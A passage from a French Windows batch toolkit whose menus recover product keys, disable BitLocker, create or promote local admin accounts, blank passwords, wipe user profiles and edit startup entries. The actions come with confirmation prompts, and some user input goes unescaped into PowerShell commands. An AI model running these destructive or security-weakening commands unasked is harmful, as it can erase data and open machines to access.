if "%exp_choice%"=="2" goto sys_drivers
if "%exp_choice%"=="3" goto sys_export_software
if "%exp_choice%"=="4" goto sys_export_wifi_apps
if "%exp_choice%"=="0" goto system_tools

if %exp_choice% GEQ 200 (
    set /a "toggle_idx=%exp_choice%-200"
    if "!toggle_idx!"=="1" call :ToggleFav "sys_win_key"
    if "!toggle_idx!"=="2" call :ToggleFav "sys_drivers"
    if "!toggle_idx!"=="3" call :ToggleFav "sys_export_software"
    if "!toggle_idx!"=="4" call :ToggleFav "sys_export_wifi_apps"
)
goto sys_export_menu

:sys_win_key
set "opts=Cle Windows OEM (Incrustee au BIOS);Cle Windows Actuelle (Installee);Cle Produit Office (via CMD)"
call :DynamicMenu "RECUPERATION DE CLES DE PRODUIT" "%opts%"
set "wk_choice=%errorlevel%"

if "%wk_choice%"=="1" goto win_key_oem
if "%wk_choice%"=="2" goto win_key_registry
if "%wk_choice%"=="3" goto win_key_office
if "%wk_choice%"=="0" goto sys_export_menu
goto sys_win_key

:win_key_oem
cls
echo ===============================================
echo      Cle Windows OEM (Carte mere / BIOS)
echo ===============================================
echo.
echo Interrogation du firmware...
powershell -NoProfile -Command "$k = (Get-CimInstance -Query 'Select * from SoftwareLicensingService' -ErrorAction SilentlyContinue).OA3xOriginalProductKey; if([string]::IsNullOrWhiteSpace($k)) { Write-Host '[ECHEC] Aucune cle OEM detectee.' ; Write-Host 'Cela signifie que ce PC ne contenait pas de licence incluse a l''achat' ; Write-Host 'ou utilise une licence numerique liee a un compte Microsoft.' } else { Write-Host '[OK] Cle de produit Windows (OEM) detectee :'; Write-Host ''; Write-Host ('    ' + $k) -ForegroundColor Green; Write-Host ''; Write-Host 'Cette cle est incrustee dans la carte mere.' }"
echo.
pause
goto sys_win_key

:win_key_registry
cls
echo ===============================================
echo      Cle Windows Installee (Registre)
echo ===============================================
echo.
echo Recherche de la cle actuellement utilisee par Windows...
set "WINKEY="
for /f "tokens=3" %%A in ('reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SoftwareProtectionPlatform" /v BackupProductKeyDefault 2^>nul ^| findstr /i "BackupProductKeyDefault"') do (
    set "WINKEY=%%A"
)
if "!WINKEY!"=="" (
    echo [ECHEC] Impossible de lire la cle par defaut dans le registre.
) else (
    echo [OK] Cle Windows installee :
    echo.
    powershell -NoProfile -Command "Write-Host '    !WINKEY!' -ForegroundColor Green"
    echo.
)
pause
goto sys_win_key

:win_key_office
cls
echo ===============================================
echo      Cle de produit Microsoft Office
echo ===============================================
echo.
echo Recherche des licences Office installees...
echo.
set "office_vbs="
if exist "%ProgramFiles%\Microsoft Office\Office16\ospp.vbs" set "office_vbs=%ProgramFiles%\Microsoft Office\Office16\ospp.vbs"
if exist "%ProgramFiles(x86)%\Microsoft Office\Office16\ospp.vbs" set "office_vbs=%ProgramFiles(x86)%\Microsoft Office\Office16\ospp.vbs"

if "!office_vbs!"=="" (
    echo [INFO] Script de statut Office non trouve ^(ospp.vbs^).
    echo Si Office est installe, sa version est peut-etre differente ^(pas 2016/2019/365^).
) else (
    echo [INFO] Depuis Office 2013, Microsoft masque volontairement
    echo la cle de licence complete sur votre ordinateur par securite.
    echo Seuls les 5 derniers caracteres sont stockes sur ce PC.
    echo.
    powershell -NoProfile -Command "$raw = cscript //nologo '!office_vbs!' /dstatus; $matches = $raw | Select-String -Pattern 'KEY'; if ($matches) { foreach($m in $matches) { Write-Host '   '$m.Line.Trim() -ForegroundColor Cyan } } else { Write-Host 'Aucune cle detectee ou en mode Abonnement / Inactif.' -ForegroundColor Yellow }"
)
echo.
pause
goto sys_win_key

:sys_god_mode
cls
echo ===============================================
echo      Creation du dossier "God Mode"
echo ===============================================
echo.
echo Le "God Mode" centralise tous les parametres de Windows
echo (+ de 200 options^) dans un seul et meme dossier.
echo.
set "GODMODE_PATH=%USERPROFILE%\Desktop\God Mode.{ED7BA470-8E54-465E-825C-99712043E01C}"
if exist "!GODMODE_PATH!" (
    echo [INFO] Le dossier God Mode existe deja sur votre Bureau.
) else (
    mkdir "!GODMODE_PATH!" >nul 2>&1
    if !errorlevel!==0 (
        echo [OK] Le dossier God Mode a ete cree sur votre Bureau !
    ) else (
        echo [ECHEC] Impossible de creer le dossier.
    )
)
echo.
pause
goto system_tools

:sys_battery_report
cls
echo ===============================================
echo      Rapport de Batterie (Sante et Usure)
echo ===============================================
echo.
echo Generation du rapport en cours...
powercfg /batteryreport /output "%USERPROFILE%\Desktop\battery_report.html" >nul 2>&1
echo.
powershell -NoProfile -ExecutionPolicy Bypass -Command "$r='%USERPROFILE%\Desktop\battery_report.html';if(Test-Path $r){$c=Get-Content $r -Raw;$d=0;$f=0;if($c -match '(?s)DESIGN CAPACITY.*?([\d\s,\xA0]+)\s*mWh'){$d=[int]($matches[1] -replace '\D','')};if($c -match '(?s)FULL CHARGE CAPACITY.*?([\d\s,\xA0]+)\s*mWh'){$f=[int]($matches[1] -replace '\D','')};if($d -gt 0){$h=[math]::Round(($f/$d)*100,2);if($h -gt 100){$h=100};$w=[math]::Round(100-$h,2);if($w -lt 0){$w=0};Write-Host ('  - Capacite d''usine : '+$d+' mWh') -f Cyan;Write-Host ('  - Capacite actuelle : '+$f+' mWh') -f Cyan;Write-Host ('  - Sante de la batterie : '+$h+'%%') -f Green;Write-Host ('  - Niveau d''usure : '+$w+'%%') -f Yellow}else{Write-Host 'Impossible de lire les donnees de capacite. (PC Fixe ou pas de batterie ?)' -f Red}}else{Write-Host 'Le fichier de rapport n''a pas pu etre cree.' -f Red}"
echo.
echo Le rapport complet (Historique, Cycles) est sur votre Bureau:
echo battery_report.html
echo.
pause
goto system_tools

:sys_bitlocker_check
cls
echo ===============================================
echo     Verification chiffrement BitLocker / Dechiffrage
echo ===============================================
echo.

set "vol_opts="
set "vol_count=0"
for /f "tokens=1,* delims=|" %%A in ('powershell -NoProfile -Command "Get-CimInstance Win32_LogicalDisk | Where-Object {($_.DriveType -eq 3 -or $_.DriveType -eq 2) -and $_.Size -gt 0} | ForEach-Object { $_.DeviceID + '|Lecteur ' + $_.DeviceID + ' ' + $_.VolumeName + ' (' + [math]::Round($_.Size/1GB,1) + ' Go)' }"') do (
    set /a vol_count+=1
    set "vol_letter[!vol_count!]=%%A"
    set "single_vol=%%A"
    if defined vol_opts (
        set "vol_opts=!vol_opts!;%%B"
    ) else (
        set "vol_opts=%%B"
    )
)

if !vol_count! equ 0 (
    echo [ECHEC] Aucun lecteur local detecte.
    pause
    goto system_tools
)

if !vol_count! equ 1 (
    set "dl=!single_vol!"
) else (
    call :DynamicMenu "CHOISISSEZ LE LECTEUR A VERIFIER" "!vol_opts!"
    set "v_choice=!errorlevel!"
    if "!v_choice!"=="0" goto system_tools
    
    for %%I in (!v_choice!) do set "dl=!vol_letter[%%I]!"
)

cls
echo Verification du statut BitLocker pour !dl! ...
manage-bde -status !dl! > "%TEMP%\bde_status.txt" 2>&1
type "%TEMP%\bde_status.txt"

rem Detection fiable (compatible FR/EN) pour eviter de proposer de dechiffrer un lecteur deja clair.
powershell -NoProfile -ExecutionPolicy Bypass -Command "$src=Get-Content '%TEMP%\bde_status.txt' -Raw; if ($src -match 'Protection\s+On' -or $src -match 'Protection\s+activ' -or $src -match '100\.0\s*%%' -or $src -match '100\,0\s*%%') { exit 1 } else { exit 0 }"
if !errorlevel! equ 0 (
    echo.
    echo Ce lecteur ne semble pas chiffre ou n'a pas termine de l'etre. 
    echo Aucune action necessaire.
    pause
    goto system_tools
)

echo.
set /p confirm_dec=Le lecteur est chiffre. Voulez-vous lancer le dechiffrement maintenant ? (O/N): 
if /i "%confirm_dec%"=="O" (
    echo Lancement du dechiffrement de %dl% ...
    manage-bde -off %dl%
    echo Commande envoyee. Le processus peut prendre du temps.
    pause
    goto system_tools
) else (
    echo Operation annulee.
    pause
    goto system_tools
)

REM ================= Embedded: Gestion des utilisateurs locaux (um_*) =================
:um_menu
setlocal ENABLEEXTENSIONS ENABLEDELAYEDEXPANSION
for /f "usebackq tokens=*" %%G in (`powershell -NoProfile -Command "$n=([System.Security.Principal.SecurityIdentifier]::new('S-1-5-32-544')).Translate([System.Security.Principal.NTAccount]).Value.Split('\\')[-1]; Write-Output $n"`) do set "UM_ADMIN_GROUP=%%G"
if not defined UM_ADMIN_GROUP set "UM_ADMIN_GROUP=Administrators"
net localgroup "%UM_ADMIN_GROUP%" >nul 2>&1 || set "UM_ADMIN_GROUP=Administrateurs"
set "UM_STR_PWD_REQ_EN=Password required"
set "UM_STR_PWD_REQ_FR=Mot de passe requis"

set "opts=Lister les utilisateurs;Ajouter un utilisateur;Supprimer un utilisateur;Gerer les droits (Standard/Admin);Ajouter/Modifier un mot de passe;Supprimer le mot de passe (Auto-login)"
call :DynamicMenu "GESTION UTILISATEURS LOCAUX" "%opts%"
set "um_choice=%errorlevel%"

if "%um_choice%"=="1" goto um_list
if "%um_choice%"=="2" goto um_add
if "%um_choice%"=="3" goto um_del
if "%um_choice%"=="4" goto um_admin
if "%um_choice%"=="5" goto um_reset
if "%um_choice%"=="6" goto um_remove_pwd
if "%um_choice%"=="0" goto um_exit
goto um_menu

:um_list
cls
echo Utilisateur           Admin   Actif   MDPDefini
echo ------------------------------------------------
powershell -NoProfile -ExecutionPolicy Bypass -Command "$ErrorActionPreference='Stop'; $adminGroups=@('Administrators','Administrateurs'); $admins=@(); foreach($g in $adminGroups){ try{ $admins+=$(Get-LocalGroupMember -Group $g -ErrorAction Stop | ForEach-Object { $_.Name.Split('\\')[-1] }) } catch{} }; $admins = $admins | Sort-Object -Unique; Get-LocalUser | Where-Object Enabled | Sort-Object Name | ForEach-Object { $u=$_; $has=$false; try { $pls = $u | Select-Object -ExpandProperty PasswordLastSet -ErrorAction Stop; if ($pls) { $has=$true } } catch {}; if (-not $has) { try { $nu = net user \"$($u.Name)\" 2>$null; $line = $nu | Where-Object { $_ -match '^(Password last set|Dernier changement du mot de passe)\s+' }; if ($line) { $val = ($line -split '\\s{2,}',2)[1].Trim(); if ($val -and $val -notmatch '^(Never|Jamais)$') { $has=$true } } } catch {} }; if (-not $has -and $u.PasswordRequired) { $has=$true }; [PSCustomObject]@{ Utilisateur=$u.Name; Admin= if($admins -contains $u.Name){'Oui'}else{'Non'}; Actif= if($u.Enabled){'Oui'}else{'Non'}; MDPDefini= if($has){'Oui'}else{'Non'} } } | Format-Table -AutoSize -HideTableHeaders" || echo Erreur lors de la liste
echo.
pause
goto um_menu

:um_admin
cls
set "user_opts="
set /a u_idx=0
for /f "tokens=*" %%U in ('powershell -NoProfile -Command "Get-LocalUser | Where-Object Enabled | Select-Object -ExpandProperty Name"') do (
    if defined user_opts (set "user_opts=!user_opts!;%%U") else (set "user_opts=%%U")
    set /a u_idx+=1
    set "user_arr[!u_idx!]=%%U"
)
if not defined user_opts (
    echo Aucun utilisateur actif trouve.
    pause
    goto um_menu
)

call :DynamicMenu "AJOUT/RETRAIT DROITS ADMIN" "%user_opts%"
set "res=%errorlevel%"
if "%res%"=="0" goto um_menu

set "UADM=!user_arr[%res%]!"
if not defined UADM goto um_menu

set "opts=Ajouter aux Administrateurs;Retirer des Administrateurs"
call :DynamicMenu "ACTION POUR !UADM!" "%opts%"
set "OP=%errorlevel%"

if "%OP%"=="1" (
    net localgroup "%UM_ADMIN_GROUP%" "%UADM%" /add
    if !errorlevel!==0 (echo '%UADM%' a ete ajoute aux Administrateurs.) else (echo Echec.)
) else if "%OP%"=="2" (
    net localgroup "%UM_ADMIN_GROUP%" "%UADM%" /delete
    if !errorlevel!==0 (echo '%UADM%' a ete retire des Administrateurs.) else (echo Echec.)
)
pause
goto um_menu


:um_add
cls
call :um_show_active
set "NEWU="
set /p NEWU="Nom d'utilisateur a ajouter > "
if "%NEWU%"=="" goto um_menu
set "SETPWD="
set /p SETPWD="Affecter un mot de passe maintenant ? (O/N) > "
if /I not "%SETPWD%"=="O" goto um_add_no_pwd

set "NEWP="
set /p NEWP="Mot de passe > "
net user "%NEWU%" "%NEWP%" /add /y
goto um_add_check

:um_add_no_pwd
net user "%NEWU%" "" /add /y

:um_add_check
if not %errorlevel%==0 (
    echo Echec de creation de l'utilisateur.
    pause
    goto um_menu
)

set "ADDADM="
set /p ADDADM="Ajouter '%NEWU%' aux Administrateurs ? (O/N) > "
if /I "%ADDADM%"=="O" net localgroup "%UM_ADMIN_GROUP%" "%NEWU%" /add
echo.
echo [OK] Utilisateur cree avec succes.
pause
goto um_menu

:um_del
cls
set "user_opts="
set /a u_idx=0
for /f "tokens=*" %%U in ('powershell -NoProfile -Command "Get-LocalUser | Where-Object Enabled | Select-Object -ExpandProperty Name"') do (
    if defined user_opts (set "user_opts=!user_opts!;%%U") else (set "user_opts=%%U")
    set /a u_idx+=1
    set "user_arr[!u_idx!]=%%U"
)
if not defined user_opts (
    echo Aucun utilisateur actif trouve.
    pause
    goto um_menu
)

call :DynamicMenu "SUPPRIMER UN UTILISATEUR" "%user_opts%"
set "res=%errorlevel%"
if "%res%"=="0" goto um_menu

set "DELU=!user_arr[%res%]!"
if not defined DELU goto um_menu

cls
echo.
echo ======================================================
echo ATTENTION : Vous allez supprimer l'utilisateur '%DELU%'
echo ET TOUT SON ESPACE SUR LE DISQUE (Images, Documents, Bureau...) !
echo ======================================================
echo.
set /p CONF=Confirmer la suppression totale ? (Tapez OUI pour valider) ^> 
if /I not "%CONF%"=="OUI" (
    echo [X] Operation annulee.
    pause
    goto um_menu
)

echo Suppression du compte Windows en cours...
net localgroup "%UM_ADMIN_GROUP%" "%DELU%" /delete >nul 2>nul
net user "%DELU%" /delete

if not %errorlevel%==0 (
    echo [ECHEC] Impossible de supprimer le compte utilisateur '%DELU%'.
    pause
    goto um_menu
)

echo [OK] Utilisateur Windows supprime.
echo.
set "TMP_PS1=%temp%\wipe_profile_%RANDOM%.ps1"

echo param($u, $l) > "%TMP_PS1%"
echo $arg='/c rmdir /s /q "'+$u+'" ^>^> "'+$l+'" 2^>^&1' >> "%TMP_PS1%"
echo "RAPPORT: Nettoyage et suppression definitive du dossier "+$u ^| Out-File -Encoding UTF8 $l >> "%TMP_PS1%"
echo $p=Start-Process 'cmd.exe' -ArgumentList $arg -PassThru -WindowStyle Hidden >> "%TMP_PS1%"
echo $f=@('-', '\', '^|', '/') >> "%TMP_PS1%"
echo $i=0 >> "%TMP_PS1%"
echo while(-not $p.HasExited) { >> "%TMP_PS1%"
echo     Write-Host -NoNewline "`r[ $($f[$i]) ] (Journal dispo sur le Bureau) Effacement des fichiers...   " -ForegroundColor Cyan >> "%TMP_PS1%"
echo     $i=($i+1) %% 4 >> "%TMP_PS1%"
echo     Start-Sleep -Milliseconds 150 >> "%TMP_PS1%"
echo } >> "%TMP_PS1%"
echo Write-Host "`r[ OK ] Dossier personnel efface. L'utilisateur a completement disparu.                      " -ForegroundColor Green >> "%TMP_PS1%"

set "LOGFILE=%USERPROFILE%\Desktop\Suppression_Profil_%DELU%.log"
powershell -NoProfile -ExecutionPolicy Bypass -File "%TMP_PS1%" "C:\Users\%DELU%" "%LOGFILE%"
del /f /q "%TMP_PS1%" >nul 2>&1

if exist "C:\Users\%DELU%" (
    echo.
    echo [!] NOTE: Certains fichiers verrouilles par l'OS n'ont pas pu
    echo etre effaces automatiquement ^(voir journal sur le Bureau^).
)

pause
goto um_menu


:um_reset
cls
set "user_opts="
set /a u_idx=0
for /f "tokens=*" %%U in ('powershell -NoProfile -Command "Get-LocalUser | Where-Object Enabled | Select-Object -ExpandProperty Name"') do (
    if defined user_opts (set "user_opts=!user_opts!;%%U") else (set "user_opts=%%U")
    set /a u_idx+=1
    set "user_arr[!u_idx!]=%%U"
)
if not defined user_opts (
    echo Aucun utilisateur actif trouve.
    pause
    goto um_menu
)

call :DynamicMenu "AJOUTER/MODIFIER LE MOT DE PASSE" "%user_opts%"
set "res=%errorlevel%"
if "%res%"=="0" goto um_menu

set "RUSER=!user_arr[%res%]!"
if not defined RUSER goto um_menu

echo.
set /p RNEWP=Nouveau mot de passe ^> 
set /p RNEWP2=Confirmez le mot de passe ^> 
if not "%RNEWP%"=="%RNEWP2%" (
    echo Les mots de passe ne correspondent pas.
    pause
    goto um_menu
)
net user "%RUSER%" "%RNEWP%"
if not %errorlevel%==0 (
    echo Echec de la mise a jour du mot de passe.
    pause
    goto um_menu
)

echo Mot de passe mis a jour.
set /p RFORCE=Exiger le changement au prochain logon ? (O/N) ^> 
if /I not "%RFORCE%"=="O" goto um_reset_end

powershell -NoProfile -ExecutionPolicy Bypass -Command "$u=[ADSI]('WinNT://' + $env:COMPUTERNAME + '/%RUSER%,user'); $u.PasswordExpired=1; $u.SetInfo()"
echo Obligation de changement au prochain logon active.

:um_reset_end
pause
goto um_menu

:um_remove_pwd
cls
set "user_opts="
set /a u_idx=0
for /f "tokens=*" %%U in ('powershell -NoProfile -Command "Get-LocalUser | Where-Object Enabled | Select-Object -ExpandProperty Name"') do (
    if defined user_opts (set "user_opts=!user_opts!;%%U") else (set "user_opts=%%U")
    set /a u_idx+=1
    set "user_arr[!u_idx!]=%%U"
)
if not defined user_opts (
    echo Aucun utilisateur actif trouve.
    pause
    goto um_menu
)

call :DynamicMenu "SUPPRIMER MDP (AUTO-LOGIN)" "%user_opts%"
set "res=%errorlevel%"
if "%res%"=="0" goto um_menu

set "RUSER=!user_arr[%res%]!"
if not defined RUSER goto um_menu

echo.
echo ======================================================
echo ATTENTION : Vous allez supprimer le mot de passe de '%RUSER%' !
echo Cela permettra a toute personne d'y acceder sans mot de passe a l'allumage.
echo.
set /p RCONFIRM=Voulez-vous vraiment continuer ? (O/N) ^> 
if /I not "%RCONFIRM%"=="O" (
    echo [X] Operation annulee.
    pause
    goto um_menu
)

net user "%RUSER%" "" >nul 2>&1
if %errorlevel%==0 (
    echo [OK] Mot de passe de l'utilisateur '%RUSER%' supprime avec succes.
) else (
    echo [ECHEC] Impossible de supprimer le mot de passe de '%RUSER%'.
)
pause
goto um_menu


:um_show_active
echo.
echo Utilisateurs actifs:
powershell -NoProfile -ExecutionPolicy Bypass -Command "Get-LocalUser | Where-Object Enabled | Sort-Object Name | Select-Object -ExpandProperty Name | ForEach-Object { $_ }" 2>nul
echo.
goto :eof

:um_exit
endlocal
goto system_tools
REM ================= End Embedded: Gestion des utilisateurs locaux =================

REM ===================================================================
REM              EXPORT LISTE DES LOGICIELS INSTALLES
REM ===================================================================
:sys_export_software
cls
echo ================================================
echo   EXPORT LISTE DES LOGICIELS INSTALLES
echo ================================================
echo.
echo  Choix du format d'export...
echo.
set "opts=Fichier TXT (lisible)~Liste simple texte sur le Bureau;Fichier CSV (Excel)~Format tableur avec colonnes separees par virgules"
call :DynamicMenu "EXPORT LOGICIELS INSTALLES" "%opts%"
set "sw_fmt=%errorlevel%"
if "%sw_fmt%"=="0" goto sys_export_menu

cls
echo ================================================
echo   ANALYSE DES LOGICIELS EN COURS...
echo ================================================
echo.
echo  [1/2] Interrogation du registre Windows...

if "%sw_fmt%"=="1" (
    powershell -NoProfile -ExecutionPolicy Bypass -Command "$f='%USERPROFILE%\Desktop\Logiciels_Installes.txt'; $p=@('HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*','HKLM:\Software\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*','HKCU:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*'); $apps=($p | ForEach-Object { Get-ItemProperty $_ -EA SilentlyContinue } | Where-Object { $_.DisplayName } | Sort-Object DisplayName | Select-Object DisplayName,DisplayVersion,Publisher -Unique); $nl=[Environment]::NewLine; $sep=New-Object string '=',60; $h='LISTE DES LOGICIELS INSTALLES - '+(Get-Date -Format 'dd/MM/yyyy HH:mm')+$nl+'Ordinateur : '+$env:COMPUTERNAME+$nl+'Total      : '+$apps.Count+' logiciels'+$nl+$sep; $h | Out-File $f -Encoding UTF8; $apps | ForEach-Object { '[+] '+$_.DisplayName+' v'+$_.DisplayVersion+' | '+$_.Publisher } | Out-File $f -Encoding UTF8 -Append; Write-Host ('  [OK] '+$apps.Count+' logiciels exportes.') -f Green"
    echo.
    echo  [2/2] Fichier TXT cree sur le Bureau !
    echo.
    echo  Fichier : Logiciels_Installes.txt
) else (
    powershell -NoProfile -ExecutionPolicy Bypass -Command "$f='%USERPROFILE%\Desktop\Logiciels_Installes.csv'; $p=@('HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*','HKLM:\Software\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*','HKCU:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*'); $apps=($p | ForEach-Object { Get-ItemProperty $_ -EA SilentlyContinue } | Where-Object { $_.DisplayName } | Sort-Object DisplayName | Select-Object DisplayName,DisplayVersion,Publisher,InstallDate -Unique); $apps | Export-Csv $f -NoTypeInformation -Encoding UTF8 -Delimiter ';'; Write-Host ('  [OK] '+$apps.Count+' logiciels exportes en CSV.') -f Green"
    echo.
    echo  [2/2] Fichier CSV cree sur le Bureau !
    echo.
    echo  Fichier : Logiciels_Installes.csv
    echo  Ouvrez-le avec Excel ou LibreOffice Calc.
)
echo.
pause
goto sys_export_menu

REM ===================================================================
REM              GESTIONNAIRE D'IMPRIMANTES
REM ===================================================================
:sys_print_manager
cls
set "opts=Lister les imprimantes installees~Affiche toutes les imprimantes et leur statut;Vider la file d'attente~Supprime tous les travaux d'impression bloques (SPOOLER);Supprimer une imprimante~Retire completement une imprimante du systeme;Redemarrer le service Spooler~Relance le gestionnaire d'impression Windows"
call :DynamicMenu "GESTIONNAIRE D'IMPRIMANTES" "%opts%"
set "pr_choice=%errorlevel%"

if "%pr_choice%"=="1" goto print_list
if "%pr_choice%"=="2" goto print_clear_queue
if "%pr_choice%"=="3" goto print_remove
if "%pr_choice%"=="4" goto print_restart_spooler
if "%pr_choice%"=="0" goto system_tools
goto sys_print_manager

:print_list
cls
echo ================================================
echo   IMPRIMANTES INSTALLEES
echo ================================================
echo.
powershell -NoProfile -Command "Get-Printer | ForEach-Object { $jobs=(Get-PrintJob -PrinterName $_.Name -EA SilentlyContinue).Count; $j=if($jobs){$jobs}else{0}; Write-Host (' [+] '+$_.Name) -f Cyan -NoNewline; Write-Host (' | Statut: '+$_.PrinterStatus+' | Travaux en attente: '+$j) -f $(if($j -gt 0){'Yellow'}else{'Gray'}) }"
echo.
pause
goto sys_print_manager

:print_clear_queue
cls
echo ================================================
echo   VIDAGE DE LA FILE D'ATTENTE D'IMPRESSION
echo ================================================
echo.
echo  [1/3] Arret du service Spooler...
net stop Spooler >nul 2>&1
echo  [2/3] Suppression des travaux bloques...
del /Q /F /S "%SystemRoot%\System32\spool\PRINTERS\*" >nul 2>&1
echo  [3/3] Redemarrage du service Spooler...
net start Spooler >nul 2>&1
echo.
echo  [OK] File d'attente videe et Spooler redemarre !
echo  Tous les travaux d'impression bloques ont ete supprimes.
echo.
pause
goto sys_print_manager

:print_remove
cls
echo ================================================
echo   SUPPRIMER UNE IMPRIMANTE
echo ================================================
echo.
echo  Imprimantes disponibles :
echo.
powershell -NoProfile -Command "$i=1; Get-Printer | ForEach-Object { Write-Host ('  ['+$i+'] '+$_.Name) -f Cyan; $i++ }"
echo.
set /p pr_name= Nom exact de l'imprimante a supprimer: 
if "%pr_name%"=="" goto sys_print_manager
echo.
powershell -NoProfile -Command "Remove-Printer -Name '%pr_name%' -EA SilentlyContinue; if($?){Write-Host '[OK] Imprimante supprimee avec succes.' -f Green}else{Write-Host '[ECHEC] Imprimante introuvable ou erreur.' -f Red}"
echo.
pause
goto sys_print_manager

:print_restart_spooler
cls
echo ================================================
echo   REDEMARRAGE DU SERVICE SPOOLER
echo ================================================
echo.
echo  Arret du Spooler...
net stop Spooler >nul 2>&1
timeout /t 2 /nobreak >nul
echo  Demarrage du Spooler...
net start Spooler >nul 2>&1
echo.
echo  [OK] Service Spooler redemarre avec succes.
echo.
pause
goto sys_print_manager

REM ===================================================================
REM              GESTIONNAIRE DES PROGRAMMES AU DEMARRAGE
REM ===================================================================
:sys_startup_manager
cls
echo ================================================
echo   PROGRAMMES AU DEMARRAGE DE WINDOWS
echo ================================================
echo.
echo  Analyse en cours...
echo.
powershell -NoProfile -ExecutionPolicy Bypass -Command ^
    "$items = Get-CimInstance Win32_StartupCommand | Select-Object Name, Command, Location, User;" ^
    "$i=1;" ^
    "Write-Host ('  Trouvé '+$items.Count+' programme(s) au démarrage:') -f Cyan;" ^
    "Write-Host '';" ^
    "foreach($x in $items){" ^
    "    Write-Host ('  ['+$i+'] '+$x.Name) -f White -NoNewline;" ^
    "    Write-Host (' | User: '+$x.User) -f DarkGray;" ^
    "    Write-Host ('       '+$x.Command) -f DarkGray;" ^
    "    $i++" ^
    "}"
echo.
echo ================================================
echo  Pour desactiver, ouvrez le Gestionnaire des taches
echo  (Ctrl+Shift+Esc) onglet 'Demarrage'.
echo.
set "opts=Desactiver via le Gestionnaire des taches~Ouvre directement Ctrl+Shift+Esc onglet Demarrage;Desactiver via Registre HKCU~Supprime une entree dans HKCU Run (utilisateur courant);Desactiver via Registre HKLM~Supprime une entree dans HKLM Run (tous utilisateurs)"
call :DynamicMenu "ACTION SUR LES PROGRAMMES DEMARRAGE" "%opts%"
set "su_choice=%errorlevel%"

if "%su_choice%"=="0" goto sys_opti_menu
if "%su_choice%"=="1" (
    powershell -Command "Start-Process taskmgr"
    timeout /t 2 /nobreak >nul
    goto sys_startup_manager
)
if "%su_choice%"=="2" goto startup_del_hkcu
if "%su_choice%"=="3" goto startup_del_hklm
goto sys_startup_manager

:startup_del_hkcu
cls
echo  Entrees dans HKCU\...\Run (utilisateur courant) :
echo.
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" 2>nul
echo.
set /p su_name= Nom de valeur a supprimer: 
if "%su_name%"=="" goto sys_startup_manager
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "%su_name%" /f
if %errorlevel%==0 (echo [OK] Entree '%su_name%' supprimee du demarrage.) else (echo [ECHEC] Entree introuvable.)
pause
goto sys_startup_manager

:startup_del_hklm
cls
echo  Entrees dans HKLM\...\Run (tous utilisateurs) :
echo.
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" 2>nul
echo.
set /p su_name= Nom de valeur a supprimer: 
if "%su_name%"=="" goto sys_startup_manager
reg delete "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v "%su_name%" /f
if %errorlevel%==0 (echo [OK] Entree '%su_name%' supprimee du demarrage.) else (echo [ECHEC] Entree introuvable.)
pause
goto sys_startup_manager

REM ===================================================================
REM              TEST DES COMPOSANTS PC (BENCHMARK)
REM ===================================================================
:sys_hw_test
cls
set "opts=Test SMART + Sante Disque~Verifie l'etat de sante SMART de tous les disques;Test de performance disque (WinSAT)~Score de vitesse lecture/ecriture du disque systeme;Test RAM (Windows Memory Diagnostic)~Lance le test memoire au prochain redemarrage;Rapport complet Composants~CPU, RAM, GPU, Disques - Resume technique;Tout tester en sequence~Lance tous les tests disponibles"
call :DynamicMenu "TEST DES COMPOSANTS PC" "%opts%"
set "hw_choice=%errorlevel%"

if "%hw_choice%"=="1" goto hw_smart
if "%hw_choice%"=="2" goto hw_winsat
if "%hw_choice%"=="3" goto hw_ram_test
if "%hw_choice%"=="4" goto hw_full_report
if "%hw_choice%"=="5" goto hw_all
if "%hw_choice%"=="0" goto system_tools
goto sys_hw_test

:hw_smart
cls
echo ================================================
echo   SANTE DES DISQUES - SMART
echo ================================================
echo.
powershell -NoProfile -ExecutionPolicy Bypass -Command ^
    "$disks = Get-PhysicalDisk | Select-Object FriendlyName,MediaType,HealthStatus,OperationalStatus,Size;" ^
    "foreach($d in $disks){" ^
    "    $color = if($d.HealthStatus -eq 'Healthy'){'Green'}else{'Red'};" ^
    "    $size = [math]::Round($d.Size/1GB,1);" ^
    "    Write-Host ('  [+] '+$d.FriendlyName+' ('+$d.MediaType+', '+$size+' Go)') -f Cyan;" ^
    "    Write-Host ('      Sante: '+$d.HealthStatus+' | Statut: '+$d.OperationalStatus) -f $color;" ^
    "    Write-Host '' " ^
    "}"
echo.
pause
goto sys_hw_test

:hw_winsat
cls
echo ================================================
echo   TEST PERFORMANCE DISQUE (WinSAT)
echo ================================================
echo.
echo  [!] Test en cours, patientez (30-60 secondes)...
echo.
winsat disk -drive c >nul 2>&1
powershell -NoProfile -Command ^
    "$r=Get-CimInstance -ClassName Win32_WinSAT -EA SilentlyContinue;" ^
    "if($r){" ^
    "    Write-Host '  Scores WinSAT:' -f Cyan;" ^
    "    Write-Host ('  Disque          : '+$r.DiskScore) -f Green;" ^
    "    Write-Host ('  CPU             : '+$r.CPUScore) -f Green;" ^
    "    Write-Host ('  RAM             : '+$r.MemoryScore) -f Green;" ^
    "    Write-Host ('  Graphismes      : '+$r.GraphicsScore) -f Green;" ^
    "    Write-Host ('  Graphismes Gaming: '+$r.D3DScore) -f Green;" ^
    "    Write-Host '';" ^
    "    $d=$r.DiskScore;" ^
    "    if($d -ge 7.5){Write-Host '  [OK] Disque tres rapide (SSD NVMe ou equivalent)' -f Green}" ^
    "    elseif($d -ge 5.5){Write-Host '  [OK] Disque rapide (SSD SATA)' -f Yellow}" ^
    "    elseif($d -ge 3.0){Write-Host '  [ATTENTION] Disque lent (HDD ou SSD use)' -f Yellow}" ^
    "    else{Write-Host '  [CRITIQUE] Disque tres lent ou defaillant !' -f Red}" ^
    "}else{Write-Host '  [INFO] Score WinSAT non disponible, relancez le test.' -f Yellow}"
echo.
pause
goto sys_hw_test

:hw_ram_test
cls
echo ================================================
echo   TEST DE LA MEMOIRE RAM
echo ================================================
echo.
echo  Le test RAM necessite un redemarrage du PC.
echo  Windows effectuera le diagnostic avant de demarrer.
echo.
set /p ramconf= Planifier le test RAM au prochain demarrage ? (O/N): 
